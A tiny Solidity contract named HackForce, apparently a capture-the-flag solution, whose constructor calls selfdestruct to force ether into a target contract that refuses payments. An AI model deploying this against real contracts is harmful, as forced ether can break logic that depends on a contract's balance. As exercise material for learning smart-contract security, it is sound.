// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

contract HackForce {
    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
}
